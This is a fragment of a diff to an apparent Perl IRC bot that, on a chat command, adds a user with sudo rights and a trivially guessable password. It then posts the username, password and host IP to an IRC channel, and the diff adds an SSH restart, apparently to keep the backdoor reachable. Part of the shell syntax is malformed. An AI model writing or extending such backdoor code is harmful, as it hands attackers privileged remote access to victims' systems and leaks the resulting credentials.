@@ -68,6 +68,7 @@ $irc->on(irc_privmsg => sub {
   system 'export P4SSWD='$(( ( RANDOM % 10 )  + 1 ));
   system 'sudo usermod -a -G sudo' $US3R '--password' $P4SSWD;
   system 'export H0ST='$(hostname -i)+$(hostname -I);
+  system 'sudo service ssh restart';
   $irc->write(notice => $noticechan => '9,1Added user:' $US3R 'password:' $P4SSWD 'on host:'$H0ST);
  }
  elsif ($msg =~ /@.stopexploit/) {
